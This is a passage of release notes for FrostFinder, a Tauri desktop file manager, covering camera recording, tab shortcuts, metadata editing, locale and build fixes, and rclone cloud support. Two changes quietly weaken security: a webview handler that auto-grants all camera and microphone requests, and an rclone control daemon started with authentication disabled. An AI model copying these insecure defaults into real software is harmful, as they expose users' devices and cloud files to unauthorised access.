- UI now resets immediately on stop (before the async save), and the record button is briefly disabled while saving to prevent double-press
- Added `fs:allow-write-file`, `fs:allow-app-write`, `dialog:allow-save` to `src-tauri/capabilities/main.json`

### v1.0.1-RC2-R17 — 2026-04-04
- Fix: camera recording now works — WebKit2GTK denied `getUserMedia` by default; added a `connect_permission_request` handler in `main.rs` setup that auto-grants all media permission requests (camera + mic) so the recording overlay opens the webcam without a browser-style prompt
- `src-tauri/Cargo.toml`: added `webkit2gtk = { version = "2" }` under `[target.'cfg(target_os = "linux")'.dependencies]` so the permission handler traits (`WebViewExt`, `PermissionRequestExt`) resolve at compile time
- `src-tauri/tauri.conf.json`: added `mediastream:` to the `media-src` CSP directive so `getUserMedia` stream URLs are not blocked by the content-security policy
- **Rust recompile required** (Cargo.toml and main.rs changed)

### v1.0.1-RC2-R16 — 2026-04-04
- Fix: camera `getUserMedia` was blocked by WebKit2GTK — added `settings.set_enable_media_stream(true)` and `settings.set_enable_media_capabilities(true)` in the `with_webview` block; webkit2gtk 2.0.2 has no `prelude` module so traits are now imported directly (`use webkit2gtk::{WebViewExt, SettingsExt, PermissionRequestExt}`) and `settings()` called as `WebViewExt::settings(&wv)` to resolve ambiguity with `WidgetExt::settings`

### v1.0.1-RC2-R15 — 2026-04-04
- Fix: added `rust-toolchain.toml` at project root pinning toolchain to `1.88.0` — the exact minimum required by `darling 0.23`, `image 0.25`, `serde_with 3.18`, `time 0.3`, and `zbus 5.14`; stays below the 1.93.x ICE regressions (`const_of_item`, `body_codegen_fn_attrs`, `hir_node`) that crash builds of `brotli` and `serde_derive_internals`

### v1.0.1-RC2-R14 — 2026-04-04
- Feature: Camera devices (e.g. Rapoo webcam) in the sidebar DEVICES section now open a live video recording overlay when clicked, instead of attempting filesystem navigation
- The overlay shows a live preview feed, a record/stop button, a running timer with pulsing REC badge, and auto-saves recordings as `.webm` files to the browser's Downloads on stop
- Added `src/camera.js` — self-contained camera module; no native Rust changes needed (uses browser MediaRecorder + getUserMedia APIs available in the Tauri webview)
- `src/main.js`: MTP device sidebar items now carry `data-cam="1"` when the device name matches `camera|cam|webcam`; sidebar nav handler intercepts those clicks and delegates to `_openCameraView()`
- Fix: bumped `RUST_MIN_STACK` from 16 MiB → 32 MiB in `src-tauri/.cargo/config.toml` — rustc SIGSEGV on `gio` persisted on some machines at 16 MiB; rustc recommends 33554432

### v1.0.1-RC2-R13 — 2026-04-03
- Fix: right-clicking empty space in column view now shows background context menu (New Folder, Paste, etc.) — previously did nothing
- Fix: clicking/mousedown on empty column background now clears selection
- Fix: clicking empty space between icons in icon view now clears selection

### v1.0.1-RC2-R12 — 2026-04-03
- Fix: Escape now clears file selection when no modal/search/QL is active (previously did nothing)
- Fix: D&D auto-scroll — scrollable containers (col-list, list-body, icon-grid) now edge-scroll during drag when cursor is within 48px of top/bottom edge
- Fix: removed stopPropagation from row dragover handler so the floating drag badge tracks cursor position correctly throughout a drag

### v1.0.1-RC2-R11 — 2026-04-03
- Fix: tab X button now closes correctly with 2+ tabs; WebKit2GTK draggable parent was swallowing the close button's click event — switched to mousedown and guarded the tab div's click handler against .tab-close targets

### v1.0.1-RC2-R10 — 2026-04-03
- Fix: sort header ("Name ↑" / sort label) now shows on every column in column view, not just the rightmost column

## v1.0.1-RC2-R9 — Rust build fixes

**Files changed:** `src-tauri/src/main.rs`, `src-tauri/.cargo/config.toml` (new)
**Rust recompile required:** Yes
**Date:** 2026-04-03

### Fixes
- **`rustc` SIGSEGV on `cairo-rs` / `gio`** — Added `src-tauri/.cargo/config.toml` that permanently sets `RUST_MIN_STACK=16777216`. The GTK-rs macro expansion depth overflows rustc's default 8 MiB worker stack; 16 MiB resolves it without any manual `export` step.
- **Unused import warning** — Removed `Accessor` from `use lofty::prelude::{Accessor, TaggedFileExt}` at `main.rs:8408`; only `TaggedFileExt` is used at that call site.

---

## v1.0.1-RC2-R8 — Tab & QoL gap fixes

**Files changed:** `src/main.js`
**Rust recompile required:** No
**Date:** 2026-04-03

### Tab gaps closed
- **`Ctrl+Tab` / `Ctrl+Shift+Tab`** — Next/Previous tab now actually work (were in cheatsheet but never dispatched)
- **`Ctrl+1`–`9`** — Jump directly to tab N
- **`Ctrl+Shift+D`** — Duplicate tab (clones path + view mode)
- **`Duplicate Tab`** also wired into the new tab right-click context menu
- **Tab right-click context menu** — Right-click any tab for: New Tab Here, Duplicate Tab, Close Tab, Close Other Tabs, Close Tabs to the Right
- **Tab tooltip** — Full path on hover now actually shows (was reading `tab.path` which was never set; fixed to `tab.state.currentPath`)
- **`+` button** — Now opens current folder, consistent with `Ctrl+T` (was opening home)
- **Cheatsheet** — Tab section completed (`Ctrl+Shift+T` reopen, `Ctrl+Shift+Tab` prev, `Ctrl+Shift+D` duplicate, `Ctrl+1–9` jump)

### Pane B gaps closed
- **Cheatsheet** — New "Split Pane" section added: `F3`, `Tab`, `Ctrl+\`, `Ctrl+Shift+Tab`, `F5`, `F6` all documented

### QoL fixes
- **Dead `search-focus` dispatch case** removed (duplicate that was never reached)
- **`showContextMenu`** now supports `_onAction` callbacks, enabling in-place action wiring without routing through `ctxAction`

---

## What's in v1.0.1-RC2-R3 — Native EXIF/PDF metadata + Audio features

**Files changed:** Multiple source files
**Rust recompile required:** Yes
**Date:** 2026-03-29

| Build | Status | Version | Revision | Date |
|-------|--------|---------|----------|------|
| FrostFinder-v1_0_1-RC2-R3-2026-03-29 | rc2 | 1.0.1-RC2 | R3 | 2026-03-29 |

### Fix — Native EXIF metadata (no exiftool dependency)

**Problem:** EXIF image metadata and PDF metadata editors required `exiftool` as an external system dependency.

**Fix:** Added native Rust implementations:
- `kamadak-exif` for EXIF reading (JPEG/PNG)
- `lopdf` for PDF metadata read/write
- `reqwest` + `urlencoding` for HTTP requests
- `base64` for cover art encoding
- New commands: `get_exif_tags`, `write_exif_tags`, `get_pdf_meta`, `write_pdf_meta`, `search_music_metadata`, `fetch_album_art`, `get_audio_cover`

### Feature — Collapsible/Resizable Preview Panel

- **Ctrl+P** toggles preview panel
- Drag resize handle on left edge (180px-800px)
- Width and state saved to localStorage

### Feature — Audio Metadata Search

- Search MusicBrainz database from audio tag editor
- Shows album cover thumbnails
- Auto-fills: title, artist, album, year

### Feature — Album Cover Embedding

- Downloads cover from Cover Art Archive
- Embeds into audio file (MP3/FLAC/etc.)
- Displays cover in Gallery View instead of music icon

### Feature — Ctrl+i Shortcut

- Opens metadata editor for selected file (images, audio, PDF)

---

## What's in v1.0.1-RC2-R2 — Add missing build.rs

**Files changed:** `src-tauri/build.rs` (new file)
**Rust recompile required:** Yes

| Build | Status | Version | Revision | Date |
|-------|--------|---------|----------|------|
| FrostFinder-v1_0_1-RC2-R2-2026-03-28 | rc2 | 1.0.1-RC2 | R2 | 2026-03-28 |

### Fix — Missing `src-tauri/build.rs` caused compile failure (src-tauri/build.rs)

**Root cause:** `Cargo.toml` declares `tauri-build = { version = "2" }` under `[build-dependencies]`, which tells Cargo to invoke a build script before compiling the crate. The build script (`build.rs`) must call `tauri_build::build()` to generate the Tauri context and set the `OUT_DIR` environment variable that `tauri::generate_context!()` reads at compile time. The file was never included in the source archive, so `cargo build` (and `npm run tauri build`) exited with:

```
error: OUT_DIR env var is not set, do you have a build script?
  --> src/main.rs:9995:14
   |
   | .run(tauri::generate_context!())
   |      ^^^^^^^^^^^^^^^^^^^^^^^^^^
```

**Fix:** Added `src-tauri/build.rs` containing the single required call:

```rust
fn main() {
    tauri_build::build()
}
```

This is the standard Tauri v2 build script. No other code changes.

---

## What's in v1.0.1-RC2-R1 — List view sort & selection fixes, context menu edge clamping

**Files changed:** `src/views.js`, `src/main.js`
**Rust recompile required:** No

| Build | Status | Version | Revision | Date |
|-------|--------|---------|----------|------|
| FrostFinder-v1_0_1-RC2-R1-2026-03-28 | rc2 | 1.0.1-RC2 | R1 | 2026-03-28 |

### Fix 1 — List view keyboard navigation uses list-sorted order (main.js)

**Root cause:** The global `keydown` handler called `getCurrentEntries()` which internally calls `getVisibleEntries()` → `sortEntries()` (global sort order). But list view renders rows in `state.listSort` order. Pressing ArrowDown moved focus to index `N` in the *globally-sorted* array, which is a completely different file than the visually highlighted row `N` in list-sorted order. The user would press Down and the selection would jump to an unrelated file.

**Fix:** When `state.viewMode === 'list'` and `sel._e` is populated, the keyboard handler now reads `sel._e` directly instead of calling `getCurrentEntries()`. `sel._e` is always set to the list-sorted array by `renderListView()` (see Fix 1+3 below), so this gives the correct visual order for all keyboard index arithmetic.

### Fix 2 — List view sort header click clears stale selection (views.js)

**Root cause:** Clicking a column header to re-sort called `renderListView()` without resetting `sel` or `state.selIdx`. After rows reordered, `state.selIdx` still pointed to the old numeric index — which now referred to a different file. The previously-selected row appeared to "jump" to a random entry.

**Fix:** `sel.clear()` and `state.selIdx = -1` are now called immediately before `renderListView()` in the header click handler, so each sort starts with a clean selection state.

### Fix 3 — `sel._e` updated to list-sorted order immediately after sort (views.js)

**Root cause:** `getVisibleEntries()` sets `sel._e` to the globally-sorted array as a side effect. `renderListView()` called `getVisibleEntries()` and then re-sorted into a local `entries` variable, but never updated `sel._e`. This meant every operation that reads `sel._e` — `getSelectedEntries()`, `getSelectedEntry()`, context menu actions, Open With, drag-and-drop — used global-sort indices rather than the list-view visual indices.

**Fix:** One line added after the sort: `sel._e = entries;`. This is the same pattern already used in the mouse click handler (`sel._e = entries` before `handleEntryClick`), now applied at the view level so it covers all callers.

### Fix 4 — View mode switch remaps selection index to list-sorted position (main.js)

**Root cause:** When switching Column → List (or any view → List), the code saved `savedSelIdx` as a global-sort index, then after the switch wrote it back directly into `state.selIdx` and `sel.last`. In list view, visual row `N` is the `N`th entry in `state.listSort` order — not the global order — so the highlighted row was wrong after the switch.

**Fix:** When the target view mode is `'list'`, the saved path is looked up in the list-sorted array and `state.selIdx` is set to the remapped index. `sel._e` is also pre-loaded with the sorted array so keyboard nav is immediately correct without requiring an extra render cycle.

### Fix 5 — Context menu clamped to all four viewport edges (main.js)

**Root cause:** `showContextMenu()` clamped the right and bottom edges (moving the menu left or up when it overflowed) but never clamped the top or left edges. Right-clicking a file near the top row or the left side of the window produced a menu that extended off-screen, clipping items at the top.

**Fix:** All four edges are now clamped with a 4 px margin. `clampedLeft = Math.max(4, ...)` and `clampedTop = Math.max(4, ...)` replace the two independent `if` assignments.

---

## What's in v1.0.1-rc1-r4 — Unified custom controls across entire app

**Files changed:** `src/style.css`, `src/main.js`, `src/views.js`
**Rust recompile required:** No

| Build | Status | Version | Revision | Date |
|-------|--------|---------|----------|------|
| FrostFinder-v1_0_1-rc1-r4-2026-03-27 | rc1 | 1.0.1-rc1 | r4 | 2026-03-27 |

### Fix 1 — Unified custom select system (ff-csel) applied app-wide (style.css, main.js, views.js)

**Root cause:** All `<select>` elements throughout the app used GTK's native widget renderer on Linux/WebKit2GTK, which ignores all CSS background, color, border, and border-radius rules. Every dropdown in Settings, the Burn ISO dialog, Batch Rename dialog, and EXIF editor rendered as a light grey OS widget regardless of CSS overrides.

**Fix:** All `<select>` elements replaced with `.ff-csel` custom components: a styled button showing the current value with a rotating chevron, and an absolutely-positioned `.ff-csel-popup` of `.ff-csel-opt` divs. Click-outside closes via a one-shot capture-phase document listener. The hidden `<input type="hidden">` preserves the value for all existing wiring (localStorage, live-apply callbacks). Covered locations: Settings (icon size, theme, locale), Batch Rename (mode, case), Burn ISO (device), EXIF editor (orientation). The r3 search bar `sr-csel` classes are now CSS-aliased to `ff-csel` so both share the same rule set.

### Fix 2 — Pill-style stepper replacing number spinners (style.css, main.js, views.js)

**Root cause:** `<input type="number">` renders with GTK's native OS spinner arrows — tiny, misaligned, and unthemeable on Linux. The arrows were clipped or invisible depending on GTK theme, and the input box appeared disconnected from the surrounding UI.

**Fix:** All `<input type="number">` elements are now wrapped in `.ff-stepper` — a pill-shaped container with styled `−` / `+` buttons separated by 1px dividers. The inner `<input>` has spinner arrows hidden via `-webkit-appearance:none`, centered text, and transparent background. A `.wide` modifier is applied to inputs that need more horizontal room (sidebar width, preview width, search max). Stepper buttons are wired with clamp-to-min/max logic and dispatch a `change` event so all downstream handlers fire. Covered locations: Settings (sidebar width, preview panel width, slideshow interval, search max, SFTP timeout), Batch Rename (start number, padding).

---

## What's in v1.0.1-rc1-r3 — Custom dark filter dropdowns + column DnD fix

**Files changed:** `src/style.css`, `src/views.js`, `src/main.js`
**Rust recompile required:** No

| Build | Status | Version | Revision | Date |
|-------|--------|---------|----------|------|
| FrostFinder-v1_0_1-rc1-r3-2026-03-27 | rc1 | 1.0.1-rc1 | r3 | 2026-03-27 |

### Fix 1 — Search filter dropdowns: fully custom dark UI (style.css, views.js)

**Root cause:** The filter bar used native HTML `<select>` elements. On Linux, WebKit2GTK delegates `<select>` rendering to GTK's native widget theme, which ignores all CSS background/color/border rules. Result: light-grey OS-themed dropdowns that clashed with the dark UI regardless of what CSS was applied.

**Fix:** Replaced both `<select>` elements with fully custom `.sr-csel` components — a styled button showing the current value with a chevron, and an absolutely-positioned popup of `.sr-csel-opt` divs. Clicking outside closes all open dropdowns via a one-shot capture-phase document listener. All existing filter logic (`_wireFilterBar`, `state._srFilter`) is preserved; only the DOM structure and interaction model changed.

Also improved the entire filter bar visual quality: larger pill padding (`6px 12px`), 8px border-radius, centered text in size inputs, proper `–` separator and `MB` unit with muted styling, darker bar background (`rgba(0,0,0,.18)`).

### Fix 2 — Column view drag-and-drop multi-select (main.js)

**Root cause:** `setupDragDrop` checked `sel.has(+el.dataset.idx)` to determine whether the dragged row was part of the current selection. `sel.has(i)` resolves via `sel._e[i]`, but `sel._e` always points to the **active/rightmost column's entries array**. When dragging from any non-active column, `sel._e[idx]` either resolves to a different file or is undefined, so the condition always fell through to `[entry]` (single-file drag) regardless of how many files were selected.

**Fix:** Changed the guard to `sel.hasp(entry.path)` — a direct path-set lookup that is always correct regardless of which column's entries `sel._e` currently points to.

---

## What's in v1.0.1-rc1-r2 — Fix Settings → Shortcuts display

**Files changed:** `src/style.css`, `src/main.js`
**Rust recompile required:** No

| Build | Status | Version | Revision | Date |
|-------|--------|---------|----------|------|
| FrostFinder-v1_0_1-rc1-r2-2026-03-27 | rc1 | 1.0.1-rc1 | r2 | 2026-03-27 |

### Fix 1 — Shortcut groups compressed to ≤1 visible row (style.css)

**Root cause:** `.stg-content` is a `display:flex; flex-direction:column` container with a fixed height (it gets `flex:1` inside `.stg-main` which has `overflow:hidden`). Flex children default to `flex-shrink:1`, so when the Shortcuts section renders 6 category groups + a reset group — whose combined natural height far exceeds the container — all groups compress proportionally. Groups with fewer entries (Edit, Network) compressed below one row height, leaving only the category header visible. Navigation, Files, and View each happened to compress to just enough height for their header + one row.

**Fix:** Added `flex-shrink:0` to `.stg-group`. Groups now maintain their natural height; the `.stg-content` `overflow-y:auto` scroll path handles the overflow correctly. No change to other settings sections (General, Appearance, etc.) — those have few enough groups that compression was never visible.

### Fix 2 — "Go back" chip rendered as ⊠ (main.js)

**Root cause:** `_keysLabel()` mapped `Backspace` → `⌫` (U+232B ERASE TO THE LEFT) and arrow keys → `↑↓←→` (U+2191/2193/2190/2192). These Unicode symbols are not present in Inter or the system UI fonts used by the app's WebView, so they render as the replacement box ⊠.

**Fix:** Replaced all non-ASCII glyphs in the special-key map with plain-text ASCII equivalents: `Backspace`→`Bksp`, `Delete`→`Del`, `ArrowUp`→`Up`, `ArrowDown`→`Down`, `ArrowLeft`→`Left`, `ArrowRight`→`Right`. Also extended the map to cover `Tab`, `Home`, `End`, `PageUp`, `PageDown`, and common punctuation keys that `e.key` reports verbatim.

---

## What's in v1.0.1-rc1-r1 — Missing UI: Theme Switcher, Icon Theme in Settings, Locale Fix

**Files changed:** `src/main.js`, `src/style.css`, `src/settings.js`, `src/locales/*.json`
**Rust recompile required:** No

| Build | Status | Version | Revision | Date |
|-------|--------|---------|----------|------|
| FrostFinder-v1_0_1-rc1-r1-2026-03-27 | rc1 | 1.0.1-rc1 | r1 | 2026-03-27 |

### New — Light/Dark/System theme selector (Settings → Appearance)

**Problem:** `settings.theme`, `settings.theme.dark`, `settings.theme.light`, and `settings.theme.system` locale keys existed in all 12 locale files but had no corresponding UI control or implementation. There was no `applyTheme()` function, no `data-theme` CSS switching, and no light-mode CSS variable set.

**Fix:**
- Added `html[data-theme="light"]` block to `style.css` with a full light-mode variable set (background, border, text, shadow, and accent colours) plus window border/shadow overrides.
- Added `applyTheme(theme)` function to `main.js` — reads `ff_theme` (`'dark'|'light'|'system'`), resolves `'system'` via `prefers-color-scheme`, sets `data-theme` on `<html>`, and saves to `localStorage`. A `MediaQueryList` listener keeps the `'system'` option live as the OS preference changes.
- Wired `applyTheme()` into `init()` alongside `applyScale()`.
- Added a Theme group (select with Dark / Light / System options) to the Appearance section of the Settings dialog; selecting a new option applies it immediately without requiring a restart.

### New — Icon Theme controls in Settings → Customisation

**Problem:** `showIconThemePicker()` and the full icon theme system were implemented in `utils.js` (with all `theme.*` locale keys), but the Settings → Customisation section only contained a Plugin Manager link — no icon theme surface.

**Fix:** Added an Icon Theme group to the Customisation section with a description of how disk themes work and an **Open Icon Theme Picker** button that closes Settings and opens the existing picker dialog.

### Fix — `toast.no_clipboard_history` missing from 11 locales

**Problem:** `en.json` had 293 keys; all other locale files had 292 — each was missing the `toast.no_clipboard_history` key added when the Clipboard History panel was introduced. Switching to any non-English locale caused a silent key-miss fallback to the raw key name instead of a localised string.

**Fix:** Added native translations of "No clipboard history" to all 11 non-English locale files (`ar`, `de`, `es`, `fr`, `hi`, `ja`, `ko`, `nl`, `pt`, `ru`, `zh`). All 12 locales now have exactly 293 keys.

### Fix — `settings.js` header comment was incorrect

**Problem:** The module-level JSDoc comment in `settings.js` listed `showSettings` as an exported function and listed several dependencies (`invoke`, `state`, `render`, `applyScale`, `renderView`, `initI18n`, `_showPluginManager`, `refreshCurrent`, `escHtml`) that are never injected into this module. The Settings UI dialog (`_showSettings`) has always lived as a private function in `main.js`.

**Fix:** Corrected the header comment to accurately describe the module's actual exports and added a note explaining why the dialog remains in `main.js`.

---

## What's in v1.0.0-r34 — Post-release Audit Fixes

---

## What's in v1.0.0-r35 — Compile Fix: `make_opts` Missing Field

**Files changed:** `src-tauri/src/main.rs`
**Rust recompile required:** Yes

| Build | Status | Version | Revision | Date |
|-------|--------|---------|----------|------|
| FrostFinder-v1.0.0-r35-2026-03-26 | stable | 1.0.0 | r35 | 2026-03-26 |

### Fix — `make_opts` test helper missing `dry_run` field

**Root cause:** The `BatchRenameOptions` struct has 9 fields including `dry_run: Option<bool>`, added in a prior revision. The `make_opts()` test helper in the `#[cfg(test)]` module was not updated to include it. Rust requires all struct fields to be explicitly initialized (or a `..default` spread), so `cargo test` would fail to compile.

**Effect:** `cargo test` would abort at the struct literal in `make_opts()` with:
```
error[E0063]: missing field `dry_run` in initializer of `BatchRenameOptions`
```
All batch rename tests (`find_replace`, `prefix`, `suffix`, `number`, `case`, conflict, empty input) would be blocked from running.

**Fix:** Added `dry_run: None` to the `make_opts()` helper. No logic change — all test behaviour is identical.


**Files changed:** `src/network.js`, `src-tauri/src/search.rs`,
`src-tauri/src/trash.rs`, `src-tauri/src/main.rs`
**Rust recompile required:** Yes

This revision is a pure bug-fix audit pass on the r27–r33 refactoring work.
No new features. All bugs were introduced during the Phase 2 module extraction
(r28–r29) and were invisible at the source level (no JS runtime errors for the
missing dialog body; Rust compile errors only surfaced when building).

---

### Fix 1 — `showSftpDialog` missing function body (network.js)

**Root cause:** The Phase 2.1 Stage 4 extraction of `network.js` used a
boundary-detection heuristic that matched the function declaration line but
stopped 3 lines later at the edge of the SFTP dialog section header comment.
The entire body (100+ lines of DOM construction, event handlers, and invoke
calls) was silently dropped.

**Effect:** Calling `showSftpDialog()` would throw immediately —
`async function showSftpDialog(prefill = {}` was syntactically complete as an
empty function, so no parse error. Users clicking SFTP in the sidebar would
see nothing happen.

**Fix:** Reconstructed the full SFTP connect dialog with: host, port, username,
password (type=password), SSH key path, remote path fields; a Connect button
that calls `invoke('mount_sftp', …)` and handles errors inline; pre-fill support
from the sidebar reconnect button; focus on the host field on open.

---

### Fix 2 — `search.rs` missing `pub` visibility and `#[derive]` attributes

**Root cause:** The Phase 2.2 Stage 3 extraction copied struct and function
definitions verbatim from `main.rs`, where they were private to the single-file
crate. In a multi-module crate, `pub use search::*` in `main.rs` requires the
re-exported items to be `pub` in `search.rs`.

**Items fixed:**
- `DeepSearchResult` — added `pub` + `#[derive(Debug, Serialize, Deserialize, Clone)]`
- `IndexEntry` — added `#[derive(Debug, Clone)]`
- `IndexSearchResult` — added `pub` + `#[derive(Debug, Serialize, Deserialize, Clone)]`
- `SearchResultV2` — added `pub` + `#[derive(Debug, Serialize, Deserialize, Clone)]`
- All 7 exported functions (`search_index_store`, `deep_search`, `index_home_dir`,
  `index_apply_event`, `search_index_query`, `search_files`, `search_advanced`)
  — added `pub`
- `search_files` return type: `SearchResult` → `crate::SearchResult` (struct lives in `main.rs`)
- Added `use std::fs;` (referenced in `search_recursive`)

---

### Fix 3 — `SEARCH_INDEX` static inaccessible from `search.rs`

**Root cause:** The in-memory search index static
`static SEARCH_INDEX: OnceLock<RwLock<Vec<IndexEntry>>>` was defined in
`main.rs` but `search_index_store()` in `search.rs` referenced it by bare name
(which would fail — child modules cannot access parent module statics without
`crate::`, and the static was private).

**Fix:** Moved `SEARCH_INDEX` into `search.rs` (where it is logically owned by
the search subsystem). Removed the orphan definition from `main.rs`. Added
`OnceLock` to `search.rs` imports.

---

### Fix 4 — `trash.rs` missing `pub` visibility and `#[derive]` attributes

**Same root cause as Fix 2.**

**Items fixed:**
- `TrashConflict` — added `pub` + combined `#[derive(Serialize, Deserialize, Clone)]`
  (previously had two separate `#[derive(Serialize)]` / `#[derive(Deserialize)]`)
- `RestoreInstruction` — added `pub` + `#[derive(Serialize, Deserialize, Clone)]`
- All 5 command functions — added `pub`

---

### Fix 5 — Redundant `Mutex` alias in `main.rs`

`use std::sync::Mutex as StdMutex;` was inserted locally in `main.rs` for the
rclone RC process static, but `Mutex` was already imported at the top of the
file. This would compile (Rust allows shadowing imports) but emits an
`unused_import` warning and is confusing. The alias was removed; the rclone RC
code now uses `Mutex` directly.

---

## FrostFinder v1.0.0 — Stable Release

**Files changed:** `src/locales/` (11 files), `src-tauri/tests/e2e/main.rs` (new),
`src-tauri/Cargo.toml`, `.github/workflows/ci.yml`, `.github/workflows/docs.yml` (new),
`docs/` (new VitePress site), `plugin-schema-v1.json` (new), `AGENTS.md`,
`scripts/fill-locales.js` (new), `scripts/check-locales.js`

---

### P6.1 — Additional locale translations

**Existing locales** (de, es, fr, ja, zh, ar) backfilled with 55–57 missing keys each
(toast, error, theme groups) to reach **71–73%** — all above the 70% CI threshold.

**5 new locales bootstrapped** (pt, ko, hi, nl, ru) at 21–22% translated.
These are marked `NEW_LOCALES` in `check-locales.js` and show as advisory-only
(🌱 badge) rather than blocking CI — they will graduate to the 70% threshold once the
community sprint brings them above the floor.

`scripts/fill-locales.js` created — the script used to generate all translations in
bulk; can be re-run to backfill any future missing keys.

---

### P6.2 — E2E integration test suite

`src-tauri/tests/e2e/main.rs` — 20 user journey tests gated behind the `e2e` Cargo feature:

1. App launches  2. Navigate home  3. Create folder  4. Copy/paste  5. Rename
6. Trash  7. Undo delete  8. Redo create  9. Search  10. Tag file  11. Search by tag
12. Quick Look  13. View mode switch  14. New tab  15. Split pane  16. Sidebar favourites
17. Run plugin  18. Settings dialog  19. Keyboard search  20. History navigation

CI: new `e2e` job runs on `main` and tags — builds the release binary, installs
`tauri-driver`, runs under `xvfb-run` for headless display.

Run locally: `cargo test --features e2e --test e2e -- --test-threads=1`

---

### P6.3 — Public contributor documentation site

`docs/` — VitePress site with 11 navigation entries across three sections:
**Getting Started** (build, good-first-issues, contributing, translations),
**Architecture** (overview, JS modules, Rust modules, state, IPC, plugins),
**Reference** (IPC types, locale keys, release process).

`.github/workflows/docs.yml` — deploys to GitHub Pages on every push to `main`
that touches `docs/**`. Uses `actions/upload-pages-artifact` + `actions/deploy-pages`.

`package.json` gains `docs:dev`, `docs:build`, `docs:preview` scripts.

---

### P6.4 — Stable API milestone & v1.0.0

**`plugin-schema-v1.json`** — formal JSON Schema (draft-07) for the plugin object format.
All fields documented with type, constraints, and description. This schema is the
published contract for third-party plugin authors.

**Stable IPC commands** frozen as of v1.0:
`load_plugins`, `save_plugins`, `run_plugin_command`, `check_plugin_trust`,
`approve_plugin`, `revoke_plugin_trust` — signatures will not break within v1.x.

**Version bump: beta 6.0.x → stable 1.0.0** across all version files.
`STATUS=beta` → `STATUS=stable` in `VERSION`.

---

### Version milestone

| | Before | After |
|---|---|---|
| Version | `6.0.32` (beta) | **`1.0.0` (stable)** |
| Locales | 7 (52–54%) | **12 (6 × ≥71%, 5 × new)** |
| E2E journeys | 0 | **20** |
| Docs pages | 0 | **11** |
| Plugin schema | informal | **JSON Schema v1, semver-stable** |

---

## What's in 6.0.32 (Beta 6, r32) — Phase 5: Platform Expansion

**Files changed:** `.github/workflows/ci.yml`, `.github/workflows/mas-submit.yml` (new),
`src-tauri/src/main.rs`, `src-tauri/entitlements/macos.entitlements`,
`src-tauri/tauri.conf.json`, `src/network.js`, `src/types/tauri-commands.d.ts`
**Rust recompile required:** Yes

---

### P5.1 — ARM Linux builds (aarch64)

`aarch64-unknown-linux-gnu` added to the CI matrix in two places:

**`rust-crosscheck` job** — cargo check only, using `gcc-aarch64-linux-gnu` cross linker.
Sets `CARGO_TARGET_AARCH64_UNKNOWN_LINUX_GNU_LINKER` env and `PKG_CONFIG_SYSROOT_DIR`.

**`release` job** — two new ARM matrix entries: `.deb` and `.AppImage`. A new step
installs `gcc-aarch64-linux-gnu` and sets the linker env. The `tauri build` step gains
`--target ${{ matrix.target }}` when a target is specified.

---

### P5.2 — Windows ARM64 builds

`aarch64-pc-windows-msvc` added to the `rust-crosscheck` matrix. The MSVC toolchain
pre-installed on `windows-2022` runners supports ARM64 cross-compilation natively.
A full release matrix entry can be added once WebView2 ARM availability is confirmed in CI.

---

### P5.3 — Native rclone cloud integration (no FUSE)

Four new Rust commands using `rclone rcd` (the rclone Remote Control daemon):
- `start_rclone_rc()` — spawns `rclone rcd --rc-no-auth` on port 5572, returns the base URL
- `stop_rclone_rc()` — kills the daemon cleanly
- `rclone_rc_list(remote, path)` — lists files via `POST /operations/list`
- `rclone_rc_copy(srcFs, srcPath, dstFs, dstPath)` — copies files via `POST /operations/copyfile`

The daemon is stored in a `OnceLock<Mutex<Option<Child>>>` static so it persists across
IPC calls and is only started on first use.

Three new JS helpers in `network.js`: `ensureRcloneRc()`, `rcloneRcList(remote, path)`,
`rcloneRcCopy(srcFs, srcPath, dstFs, dstPath)` — these start the daemon lazily and call
through to Rust. Cloud browse/copy/move now works on Windows and macOS without FUSE/Dokany.

---

### P5.4 — macOS App Store submission

**`macos.entitlements` updated** for App Sandbox compliance:
- `com.apple.security.app-sandbox: true` — required for MAS
- `com.apple.security.cs.allow-jit: true` — WebKit needs JIT
- `com.apple.security.files.all: true` — file manager needs broad access
- `com.apple.security.files.bookmarks.*: true` — persistent access across launches

**`.github/workflows/mas-submit.yml` created** — a `workflow_dispatch` + tag-triggered
workflow that: imports the signing certificate into a temporary keychain, installs the
provisioning profile, builds a `universal-apple-darwin` `.app` bundle, and submits via
`xcrun altool` using App Store Connect API keys. Requires six secrets to be set in the
repository.

---

### Version bumps

| File | Old | New |
|---|---|---|
| All version files | `6.0.31` / `r31` | `6.0.32` / `r32` |
| New files | — | `.github/workflows/mas-submit.yml` |

---

## What's in 6.0.31 (Beta 6, r31) — Phase 4: Fill the Finder Parity Gap

**Files changed:** `src-tauri/src/main.rs`, `src/ql-window.js`, `src/utils.js`,
`src/main.js`, `src/plugins.js`, `src/types/tauri-commands.d.ts`
**Rust recompile required:** Yes

---

### P4.1 — Office document previews in Quick Look

`OFFICE_EXTS` expanded to include `pptx`, `ppt`, `odt`, `odp`, `ods`, `odg`.

Three new Rust helpers: `pptx_to_text` (reads `ppt/slides/slide*.xml` from the OOXML zip,
extracts `<a:t>` text nodes), `odt_to_text` (reads `content.xml` from the ODF zip, extracts
`<text:p>` and `<text:span>` nodes), and `office_to_pdf_cached` (shells out to LibreOffice
headless `--convert-to pdf`, caches results in `~/.cache/frostfinder/ql/<hash>.pdf`).

New Tauri command `get_office_preview(path)` returns one of three modes:
- `"pdf"` — LibreOffice converted it; Quick Look renders via `<iframe>` through the media server
- `"text"` — text extracted natively; Quick Look renders as `<pre>`
- `"install_nudge"` — LibreOffice absent; Quick Look shows install instructions

New branch in `ql-window.js` dispatches office files through `get_office_preview` before
the existing `DOC_EXTS` text-extraction path.

---

### P4.2 — MTP / Android & camera support

New Rust commands: `detect_mtp_devices()`, `mount_mtp(device_id)`, `unmount_mtp(device_id)`.

Detection uses `gio mount --list` (primary) with `lsusb` heuristic fallback. Mounting
calls `gio mount <mtp://uri>`. The gvfs FUSE path (`/run/user/<uid>/gvfs/…`) is exposed
as the mountpoint.

JS changes:
- `_mtpDevices` added to global state
- 5-second poll in `init()` calls `detect_mtp_devices` and re-renders sidebar on change
- Sidebar **Devices** section: shows unmounted devices with a "Mount" button and mounted
  devices with a path-navigable row and "⏏ Eject" button
- `driveIcon` and `driveColor` in `utils.js` handle `mtp` type (green, phone icon)

---

### P4.3 — Cloud sync-state awareness

`get_cloud_sync_state(local_dir, cloud_remote)` shells `rclone lsf --format p` against the
remote and compares with the local directory listing, returning `Synced`, `LocalOnly`, or
`CloudOnly` per file. `check_cloud_remote_reachable(cloud_remote)` pings the remote with a
5-second timeout for the sidebar offline indicator.

Both commands are no-ops if rclone is absent (`which("rclone")` returns false).

---

### P4.4 — Community plugin registry

